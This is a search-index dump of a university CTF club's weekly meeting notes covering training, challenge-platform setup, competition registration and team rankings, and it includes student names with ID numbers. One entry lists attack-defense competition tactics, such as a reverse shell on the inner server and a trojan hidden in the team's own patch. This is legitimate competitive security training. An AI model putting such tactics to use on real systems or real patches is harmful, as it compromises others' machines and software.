IN-PERSON conference on June 30 taking place during Tel Aviv University\u2019s Cyber Week.</p> <p>We will announce updates on our mailing list and social media when registration resumes, stay tuned!</p> <p>If you plan to join us virtually, you do not need a ticket to watch the live stream or Join our Slack!</p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/#note","title":"Note","text":"<ul> <li>[ ] \u7b79\u5907\u5468\u672b\u7684\u8bad\u7ec3\u9898\u76ee\u4e0e\u6750\u6599</li> <li>[ ] \u53d1\u4e00\u5c01\u9080\u8bf7\u90ae\u4ef6</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-23/","title":"CTF Week Meeting 2022-06-23","text":"<ol> <li>The first week of the summer schedule.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-23/#summer-schedule","title":"Summer schedule","text":"<p>The progress isn't good...</p> <ul> <li>12110842 \u5218\u6b23\u840c</li> <li>12112848 \u674e\u70e8</li> </ul> <p>We have 2 new members for this summer.</p> <p>I'm working on the advertisement for all students.</p> <p></p>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-23/#upcoming-events","title":"Upcoming events","text":""},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-23/#azure-assassin-alliance-ctf-2022","title":"Azure Assassin Alliance CTF 2022","text":"<p>2022-06-25 09:00:00\u2014\u20142022-06-27 09:00:00</p> <p>https://adworld.xctf.org.cn/competition/</p> <p>\u672c\u5c4aACTF 2022\u662f\u7531XCTF\u8054\u8d5b\u7684\u5408\u4f5c\u5355\u4f4dAAA\u6218\u961f (Azure Assassin Alliance\uff09\u7ec4\u7ec7\uff0c\u7531\u8d5b\u5b81\u7f51\u5b89\u63d0\u4f9b\u6280\u672f\u652f\u6301\u3002\u4f5c\u4e3a\u7b2c\u4e03\u5c4aXCTF\u56fd\u9645\u8054\u8d5b\u7684\u5206\u7ad9\u8d5b\uff0c\u672c\u6b21\u6bd4\u8d5b\u5c06\u91c7\u7528\u5728\u7ebf\u7f51\u7edc\u5b89\u5168\u593a\u65d7\u6311\u6218\u8d5b\u7684\u5f62\u5f0f\uff0c\u9762\u5411\u5168\u7403\u5f00\u653e\u3002</p> <p>\u6b64\u6b21\u6bd4\u8d5b\u51a0\u519b\u961f\u4f0d\u5c06\u76f4\u63a5\u664b\u7ea7\u7b2c\u4e03\u5c4aXCTF\u603b\u51b3\u8d5b\uff08\u603b\u51b3\u8d5b\u5177\u4f53\u5730\u70b9\u65f6\u95f4\u5f85\u5b9a\uff0c\u5c06\u5728\u786e\u5b9a\u540e\u901a\u77e5\u83b7\u5f97\u8d44\u683c\u7684\u56fd\u9645\u548c\u56fd\u5185\u961f\u4f0d\uff09\u3002\u5176\u4ed6\u53c2\u8d5b\u7684\u961f\u4f0d\u4e5f\u5c06\u83b7\u5f97\u79ef\u5206\uff0c\u6765\u7ade\u4e89XCTF\u603b\u51b3\u8d5b\u7684\u5176\u4ed6\u5e2d\u4f4d\u3002</p> <ul> <li>\u6bd4\u8d5b\u7684\u9080\u8bf7\u4f1a\u79c1\u804a\u53d1\u9001\u7ed9\u6821\u961f\u6210\u5458</li> </ul>"},{"location":"Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-23/#note","title":"Note","text":"<ul> <li>[ ] \u51c6\u5907\u672c\u5468\u7684\u8bad\u7ec3\u5185\u5bb9\u4e0e\u9898\u76ee\u66f4\u65b0</li> <li>[ ] \u79c1\u804a\u9080\u8bf7\u53c2\u52a0\u8fc7\u7ade\u8d5b\u7684\u6210\u5458\u52a0\u5165</li> <li>[ ] \u7a7a\u95f4\u5ba3\u4f20+\u7fa4\u5ba3\u4f20</li> <li>[ ] \u8d5b\u9898\u5e73\u53f0\u66f4\u65b0\uff0c\u4fee\u6539\u90e8\u7f72\u65b9\u5f0f</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-07/","title":"CTF Week Meeting 2022-07-07","text":"<ol> <li>Training schedule.</li> <li>CTFd-whale environment and challenge docker.</li> <li>Competition register notification.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-07/#training-schedule","title":"Training Schedule","text":"<p>Summer schedule have already finished the first two weeks. From the last week, we have 53 registered members.</p> <p>The offline training has 19 members in the morning, and 22 members in the afternoon.</p> <p>Every week I have selected several challenges for learning. If you are interested, finish those challenges from https://compass.ctfd.io/</p> <p>For this week, I'm designing new materials for the advanced network and web exploiting. Some new challenges would be used.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-07/#ctfd-whale","title":"CTFd-whale","text":"<p>http://detroit.sustech.edu.cn now has a functional CTFd-whale environment. I'm working on the following works:</p> <ul> <li>Applying Internet connection for the website.</li> <li>Applying HTTPS port.</li> <li>Syncing challenge environments with CTFd-whale docker.</li> </ul> <p>The new type of challenge platform would be online in a week.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-07/#competition-notification","title":"Competition Notification","text":"<p>\u5f3a\u56fd\u676f</p> <p>https://www.qiangguobei.org.cn/</p> <p>The register due on July, 15th.</p> <p>If you want to join this event, please contact me.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-07/#note","title":"Note","text":"<ul> <li>[ ] \u5468\u672b\u8bad\u7ec3\u6750\u6599\u66f4\u65b0+\u57fa\u7840\u5185\u5bb9\u8865\u5145</li> <li>[ ] \u9898\u76ee\u5bb9\u5668\u6253\u5305\u8fc1\u79fb</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-14/","title":"CTF Week Meeting 2022-07-14","text":"<ol> <li>Training schedule.</li> <li>CTFd-whale environment and challenge docker.</li> <li>Competition register notification.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-14/#training-schedule","title":"Training Schedule","text":"<p>Summer schedule have already finished the first two weeks. From the last week, we have 53 registered members.</p> Date Morning Afternoon Week 2 19 22 Week 3 14 21 <p>In the past few weeks we have some interesting sharing materials. Including things I haven't mentioned in the tutorial.</p> <p>In this weekend, we would look forward to the sharing from:</p> <ul> <li>\u51af\u6cc9\u5f3c: HTTP Request Smuggling</li> <li>\u5434\u4e93: CTF 101 Web Tutorial</li> <li>\u5510\u9a9e: SQL Injection</li> </ul> <p>Hope everyone enjoys summer schedule.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-14/#ctfd-whale","title":"CTFd-whale","text":"<p>http://detroit.sustech.edu.cn is now applying for the public Internet access. The ports are 80/443, 28000-30000.</p> <p>https://hub.docker.com/search?q=compassctf contains the docker image for CTFd-whale containers. I'm still working on the image construction. The old https://compass.ctfd.io/ would be configured to the new location after the setup.</p> <p>Containers I have done:</p> <ul> <li>php_inclusion</li> <li>php4fun6</li> <li>web11</li> <li>003fileupload</li> <li>php_audit</li> <li>callme</li> <li>php4fun9</li> <li>php4fun2</li> <li>php4fun1</li> <li>php4fun4</li> <li>cbc</li> <li>web12</li> <li>badchars</li> <li>php4fun5</li> <li>web9</li> </ul> <p>Containers under construction:</p> <ul> <li>sanity_check</li> <li>web_sign</li> <li>dove_server</li> <li>tricky_php</li> <li>bbs</li> <li>wish_server</li> <li>ret2win</li> <li>split</li> <li>write4</li> <li>fluff</li> <li>pivot</li> <li>exec_1</li> </ul> <p>Meanwhile, I'm going to write a quick start for CTFd-whale docker image construction, and we can make some new nice challenges.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-14/#competition-notification","title":"Competition Notification","text":""},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-14/#_1","title":"\u7f51\u9f0e\u676f","text":"<p>The ITS has called me to sign up this competition, and we would like to attend this event.</p> <p>https://www.wangdingcup.com/</p> <p>Register due to July, 27th. Please send me those information:</p> <ol> <li>Your name.</li> <li>Your phone number.</li> <li>Your ID number.</li> <li>Your department.</li> <li>Your email.</li> </ol> <p>The information can be sent through WeChat directly, otherwise by using my PGP public key to encrypt.</p> <pre><code>-----BEGIN PGP PUBLIC KEY BLOCK-----\nVersion: Keybase OpenPGP v2.0.76\nComment: https://keybase.io/crypto\n\n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\n=s/qg\n-----END PGP PUBLIC KEY BLOCK-----\n</code></pre> <p>I won't store your information. So, I might ask you for those information again for different events.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-14/#enowars-6","title":"ENOWARS 6","text":"<p>https://6.enowars.com/</p> <p>\u661f\u671f\u516d, 16 \u4e03\u6708 2022, 21:00 CST \u2014 \u661f\u671f\u65e5, 17 \u4e03\u6708 2022, 05:00 CST</p> <p>An A/D CTF, I've signed up for team C0MP4SS.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-14/#note","title":"Note","text":"<ul> <li>[ ] \u5468\u672b\u8bad\u7ec3\u6750\u6599\u66f4\u65b0+\u57fa\u7840\u5185\u5bb9\u8865\u5145</li> <li>[ ] \u9898\u76ee\u5bb9\u5668\u6253\u5305</li> <li>[ ] AWD\u6b66\u5668\u5e93\u642d\u5efa</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-21/","title":"CTF Week Meeting 2022-07-21","text":"<ol> <li>Events register.</li> <li>Summer schedule update.</li> <li>Guangdong Province CTF 2nd Final.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-21/#events-register","title":"Events register","text":"<p>https://bm.ichunqiu.com/2022qwb</p> <p>\u5f3a\u7f51\u676f 6th 7.30 - 7.31</p> <p>We have 2 teams currently, one has 10 members, the other has 7 members.</p> <p>Team1: HED</p> HED/role name Leader \u90ac\u4e00\u5e06 Member \u91d1\u8087\u8f69 Member \u4e25\u6587\u8c26 Member \u9648\u6893\u6db5 Member \u5deb\u6653 Member \u6731\u5609\u6960 Member \u674e\u70e8 Member \u9ece\u8bd7\u73a5 Member \u5510\u9a9e Member \u5218\u6b23\u840c <p>Team2: kfccrazythursdayvme50yuan</p> role name Leader \u674e\u7167 Member \u5218\u4e50\u5947 Member \u51af\u6cc9\u5f3c Member \u5f90\u5ef6\u6977 Member \u8c22\u5b50\u665f Member \u5b59\u794e\u6d9b Member \u738b\u4e59 Member \u91d1\u626c <p>The first team is registered, and the second team is waiting for all the phone numbers to be signed up.</p> <p>Later today, I will collect some recent challenges and their writeups.</p> <p>\u91c7\u53d6\u5728\u7ebf\u89e3\u9898\uff08Jeopardy\uff09\u6a21\u5f0f\uff0c\u4e3b\u8981\u9762\u5411\u56fd\u5185\u9ad8\u6821\u3001\u4f01\u4e1a\u3001\u673a\u6784\u7b49\u7f51\u7edc\u5b89\u5168\u529b\u91cf\uff0c\u6bcf\u961f\u4e0d\u8d85\u8fc710\u540d\u53c2\u8d5b\u961f\u5458\u548c1\u540d\u8d5b\u961f\u6307\u5bfc\u3002\u8d5b\u9898\u5185\u5bb9\u4e3b\u8981\u6d89\u53ca\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u9006\u5411\u5206\u6790\u3001\u5bc6\u7801\u5206\u6790\u3001\u667a\u80fd\u7ec8\u7aef\u5b89\u5168\u3001\u4fe1\u606f\u9690\u85cf\u3001\u4eba\u5de5\u667a\u80fd\u7b49\u7f51\u7edc\u5b89\u5168\u9886\u57df\u7684\u4e3b\u8981\u77e5\u8bc6\u4e0e\u6280\u80fd\uff0c\u91cd\u70b9\u8003\u5bdf\u53c2\u8d5b\u4eba\u5458\u7f51\u7edc\u5b89\u5168\u77e5\u8bc6\u7684\u7efc\u5408\u8fd0\u7528\u80fd\u529b\u548c\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u7684\u521b\u65b0\u5b9e\u8df5\u80fd\u529b\u3002\u6bd4\u8d5b\u65f6\u95f42022\u5e747\u670830\u65e5-31\u65e5\u3002</p> <p>\u4e00\u7b49\u5956 \u7b2c1-3\u540d 3\u4e07RMB/\u961f</p> <p>\u4e8c\u7b49\u5956 \u7b2c4-10\u540d 2\u4e07RMB/\u961f</p> <p>\u4e09\u7b49\u5956 \u7b2c11-32\u540d 1\u4e07RMB/\u961f</p> <p>\u6700\u4f73\u9898\u76ee\u5956 \u51711\u540d 2\u4e07RMB/\u9898</p> <p>\u4f18\u79c0\u9898\u76ee\u5956 \u51716\u540d 5000\u5143RMB/\u9898</p> <p>\u7ade\u8d5b\u5b98\u65b9QQ\u7fa4\uff1a856775704</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-21/#summer-schedule-update","title":"Summer schedule update","text":"<p>The past training:</p> Time Topic Introduction Material June, 26th CTF Overview &amp; Fun-oriented challenges. Learn about what's CTF and how we win a CTF. The attendance of competitions and how to group a team. Introduction to CTF.pdf Sakai page Kali Linux Linux challenges Linux tutorial Python tutorial July, 3rd Web Challenges and Databases (Basics) Ability to learn computer networks and hack websites. Know HTTP &amp; HTTPS in protocol, and tools to capture / modify packets. Web Basics and Databases.pdf OWASP vulnerabilities PHP basics HTML MDN CSS MDN JavaScript MDN July, 10th Practice, Solving Web Challenges (Advanced) Why websites are vulnerable, learn how to crack a website, and solve some web challenges. Find the weakness in the websites and common vulnerabilities. Advanced Web Hacking.pdf Linux Basics BlackHat SSTI PDF CTF101 Web Web learning notes July, 17th Forensics &amp; Steganography Analyze the file format and hidden information. Packet or network traffic analysis as well. Several skills to check images. Forensics_Steganography.pdf CTF 101 Forensics 1earn Forensics <p>The rest training:</p> July, 24th Modern Cryptography and Mathematics Asymmetric cryptography like RSA, ECC. A mathematic definition of security and attacks on modern cryptography. Cryptography.pptx July, 31st Assembly Language and Reverse Engineering Learn about some CISC knowledge. Use x86_64 as an example to do the assembly. Some reverse engineering skills are involved. Reverse.pdf August, 7th Binary Exploitations PWN challenges. Buffer overflows, shellcodes, ROP, and some pwn challenges. Binary Exploitation.pdf <p>This weekend, the engineering department would be powered off. The training schedule for this weekend may be online.</p> <p>I've invited some 2022 new students to attend the cryptography training this weekend.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-21/#guangdong-province-ctf-2nd","title":"Guangdong Province CTF 2nd","text":"<p>In the past qualification, the HED team has qualified for the final round.</p> role name Leader \u90ac\u4e00\u5e06 Member \u4e25\u6587\u8c26 Member \u6731\u5f18 Member \u6731\u5609\u6960 <p></p> <p>Before the competition, we would have several AWD training. The time can be arranged according to your schedule.</p> <ul> <li>Acceptable time: any time in the summer / Sundays in September.</li> <li>Training materials: AWD toolkit &amp; AWD tricks.</li> <li>PVP: https://ctf.bugku.com/pvp.html</li> </ul> <p>Better to be offline, in case we can have discussions about AWD.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-21/#notes","title":"Notes","text":"<ul> <li>[ ] AWD toolkit.</li> <li>[ ] Register for the 2nd team.</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-28/","title":"CTF Week Meeting 2022-07-28","text":"<ol> <li>QiangWang Cup event update.</li> <li>DiceCTF rank and ctftime team rank.</li> <li>Guangdong CTF 2nd Final notes.</li> <li>Summer schedule.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-28/#qiangwang-cup-event-update","title":"QiangWang Cup event update","text":"<p>https://bm.ichunqiu.com/2022qwb</p> <p>\u5f3a\u7f51\u676f 6th 7.30 - 7.31</p> <p>We have 2 teams currently, one has 10 members, the other has 7 members.</p> <p>Team1: HED</p> HED/role name Leader \u90ac\u4e00\u5e06 Member \u91d1\u8087\u8f69 Member \u4e25\u6587\u8c26 Member \u9648\u6893\u6db5 Member \u5deb\u6653 Member \u6731\u5609\u6960 Member \u674e\u70e8 Member \u9ece\u8bd7\u73a5 Member \u5510\u9a9e Member \u5218\u6b23\u840c <p>Team2: kfccrazythursdayvme50yuan</p> role name Leader \u674e\u7167 Member \u5218\u4e50\u5947 Member \u51af\u6cc9\u5f3c Member \u5f90\u5ef6\u6977 Member \u8c22\u5b50\u665f Member \u5b59\u794e\u6d9b Member \u738b\u4e59 Member \u91d1\u626c <p>Please join the corresponding notion group to co-operate in the competition.</p> <p>We have a discord group for voice chat:</p> <ul> <li>https://discord.gg/Cy2vCpsB</li> </ul> <p>\u7ade\u8d5b\u5b98\u65b9QQ\u7fa4\uff1a856775704</p> <p>Hope you enjoy this competition!</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-28/#dicectf-rank-and-ctftime-team-rank","title":"DiceCTF rank and ctftime team rank","text":"<p>@Frankss @Monad, we won 21 rank in the DiceCTF 2022.</p> <p>Yet another win against pkucc and n03tAck QwQ.</p> <p>The competition has some very interesting challenges and tricks, I'll collect them and publish on the Detroit CTF platform.</p> <p>In the meanwhile, we got 27.853 ctftime scores. The coutry rank of our team is updated to 21st place.</p> <p>Congratulations every member! \ud83c\udf89\ud83c\udf89\ud83c\udf89</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-28/#guangdong-ctf-2nd-final-notes","title":"Guangdong CTF 2nd Final notes","text":"<p>We've participated Guangdong CTF 2nd final meeting yesterday.</p> <p>The key information:</p> <ul> <li>The final round would be in DAWD (DataCon AWD).</li> <li>The players can't reach the inner server.</li> <li>The players can push patch and exp to the server.</li> <li>EDR and rootkit are not valid. But WAF is valid.</li> </ul> <p>We may need to try:</p> <ul> <li>Reverse shell to get the operation privilege in the inner server.</li> <li>Anonymous EDR for local service.</li> <li>Network traffic analysis and block: replace flag.</li> <li>Store a trojan in our own patch and image file.</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-28/#summer-schedule-update","title":"Summer schedule update","text":"<p>The past training:</p> Time Topic Introduction Material June, 26th CTF Overview &amp; Fun-oriented challenges. Learn about what's CTF and how we win a CTF. The attendance of competitions and how to group a team. Introduction to CTF.pdf Sakai page Kali Linux Linux challenges Linux tutorial Python tutorial July, 3rd Web Challenges and Databases (Basics) Ability to learn computer networks and hack websites. Know HTTP &amp; HTTPS in protocol, and tools to capture / modify packets. Web Basics and Databases.pdf OWASP vulnerabilities PHP basics HTML MDN CSS MDN JavaScript MDN July, 10th Practice, Solving Web Challenges (Advanced) Why websites are vulnerable, learn how to crack a website, and solve some web challenges. Find the weakness in the websites and common vulnerabilities. Advanced Web Hacking.pdf Linux Basics BlackHat SSTI PDF CTF101 Web Web learning notes July, 17th Forensics &amp; Steganography Analyze the file format and hidden information. Packet or network traffic analysis as well. Several skills to check images. Forensics_Steganography.pdf CTF 101 Forensics 1earn Forensics July, 24th Modern Cryptography and Mathematics Asymmetric cryptography like RSA, ECC. A mathematic definition of security and attacks on modern cryptography. Cryptography.pptx <p>The rest training:</p> July, 31st Assembly Language and Reverse Engineering Learn about some CISC knowledge. Use x86_64 as an example to do the assembly. Some reverse engineering skills are involved. Reverse.pdf August, 7th Binary Exploitations PWN challenges. Buffer overflows, shellcodes, ROP, and some pwn challenges. Binary Exploitation.pdf <p>I'm not at the campus currently. The training schedule for this weekend may be online.</p> <p>The CTF training is hard, but I hope you can learn something new, and enjoy the trip to the cybersecurity.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-28/#notes","title":"Notes","text":"<ul> <li>[ ] Ready for the GD CTF 2nd Final script.</li> <li>[ ] Move all the challenges to the Detroit server.</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-04/","title":"CTF Week Meeting 2022-08-04","text":"<ol> <li>QiangWang Cup event rank.</li> <li>Summer schedule final exam challenges.</li> <li>Upcoming events: Wangding Cup register.</li> <li>Today's entertainment: CTFshow event.</li> <li>Some thoughts about the ranks &amp; cyber security.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-04/#qiangwang-cup-event-rank","title":"QiangWang Cup event rank","text":"<p>The competition has ended. 2 of our teams have achieve great ranks:</p> Team Rank HED 74 kfccrazythursdayv50 248 <p>The competition takes 10 members in a team. During the competition, we used notion for challenge synchronize and progress tracking.</p> <p>The defect of this event is the PWN part. We've done great in other aspects, except PWN. Learning about some PWN ideas would be our next step:</p> <ul> <li>GLIBC vulnerabilities.</li> <li>Linux kernel vulnerabilities.</li> <li>Other binary exploitations.</li> </ul> <p>A experienced PWN player would talk about the PWN sections this weekend. I'm looking forward to the PWN talk.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-04/#summer-final-exam","title":"Summer final exam","text":"<p>Our summer schedule would be ended in August 14th. The final exam would be held on the Detroit platform.</p> <p>I'm collecting grades and finding final exam challenges.</p> <p>If you have great challenge, please inform me.</p> <ul> <li>Challenge categories: misc, web, crypto, re, pwn.</li> <li>Challenge format: any formats are fine, dockers better.</li> </ul> <p>The dynamic challenge environment would be set to use an environment variable <code>$FLAG</code>, if you want to setup dynamic flag for your challenge, you can read this variable in the flag configuration.</p> <p>Besides, using flag file is also fine.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-04/#wangding-cup","title":"Wangding Cup","text":"<p>https://www.wangdingcup.com/</p> <p>Register till August 19th 20:00.</p> <p>Possible time:</p> <ul> <li>For university: August 26th.</li> <li>For companies: August 31st.</li> </ul> <p>This event is one of the most famous CTF competitions. The size for each team is 4 members, we are going to have 2 or 3 teams.</p> <p>This event would be easier than the Qiangwang cup. However, it's not easy to get into the final round.</p> <p>If you are interested in this event, please send me the register information.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-04/#ctfshow","title":"CTFshow","text":"<p>https://www.ctf.show/challenges</p> <p>An interesting event on ctf.show would be held today.</p> <p>Start time: 18pm.</p> <p>Duration: 24 hours.</p> <p>If you are looking forward some interesting (instead of hard events), don't miss this.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-04/#about-the-ranks-cyber-security","title":"About the ranks &amp; cyber security","text":"<p>...</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-04/#notes","title":"Notes","text":"<ul> <li>[ ] Ready for the GD CTF 2nd Final script.</li> <li>[ ] Move all the challenges to the Detroit server.</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-11/","title":"CTF Week Meeting 2022-08-11","text":"<ol> <li>Summer schedule final exam challenges.</li> <li>Upcoming events: Wangding Cup register.</li> <li>Other competitions.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-11/#summer-schedule-final","title":"Summer schedule final","text":"<p>Our summer schedule would be ended in August 14th. The final exam would be held on the Detroit platform.</p> <p>CTFd-whale has worked properly. In case the Detroit platform has un-predictable problems, we would have a backup location at CTFd as well.</p> <p>The challenges categories:</p> Category Challenge Difficulty Misc 3 Easy to Medium Web 4 Easy to Hard Crypto 3 Medium Re 3 Medium to Hard PWN 4 Medium to Hard <p>I would update the challenges to a self-hosted CTFd for test. Team members can access this platform to try the challenges.</p> <p>Challenge time: August 14th 9:00am to 17:00pm.</p> <p>Challenge solving: please solve by yourself, teaming and cheating are not allowed.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-11/#wangding-cup","title":"Wangding Cup","text":"<p>https://www.wangdingcup.com/</p> <p>Register till August 19th 20:00.</p> <p>Possible time:</p> <ul> <li>For 